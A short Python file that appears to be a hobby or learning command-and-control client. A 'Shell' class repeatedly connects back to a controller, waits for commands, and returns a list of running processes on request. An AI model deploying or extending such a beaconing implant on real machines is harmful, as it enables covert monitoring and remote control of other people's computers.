import psutil
import socket
import sys
import time


class Enumerate:
    @staticmethod
    def get_processes():
        return_statement = ""
        processes = psutil.process_iter()  # get list of running processes

        # iterate through list
        for process in processes:
            try:
                pid = process.pid  # get process ID
                process_name = process.name()  # get process name

                cpu_usage = process.cpu_percent()  # get CPU usage
                memory_usage = process.memory_info().rss / 1048576  # get memory usage in megabytes (from bytes --> MB)

                # append information to return statement
                return_statement += f"Process Name: {process_name}, PID: {pid}, CPU Usage: {cpu_usage}%," \
                                    f" Memory Usage: {memory_usage}\n"
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Ignore errors
                pass
        return return_statement


class Shell(Enumerate):
    def __init__(self, ip, port, buffer):
        self.ip = ip
        self.port = port
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        while True:
            try:
                time.sleep(2.5)  # sleep to avoid flooding requests
                self.socket.connect((self.ip, self.port))  # connect to controller
                self.receive()  # receive data
            except ConnectionRefusedError:
                # Connection refused, retry
                continue
            except KeyboardInterrupt:
                self.socket.close()
                sys.exit(0)

    def receive(self):
        try:
            while True:
                command = self.socket.recv(self.buffer).decode("utf-8")

                if not command:
                    # Lost connection with server, attempt to re-establish connection
                    self.socket.close()  # close socket
                    self.__init__(self.ip, self.port, self.buffer)  # recreate socket
                    self.connect()  # attempt to reconnect

                if 'terminate' in command:
                    self.socket.close()
                    sys.exit(0)
                elif 'get_processes' in command:
                    result = self.get_processes()
                    self.send(result)
                else:
                    print(command)

        except KeyboardInterrupt:
            self.socket.close()
            sys.exit(0)

    def send(self, message):
        self.socket.sendall(bytes(message, "utf-8"))


if __name__ == '__main__':
    shell = Shell('127.0.0.1', 6969, 2048)
    shell.connect()
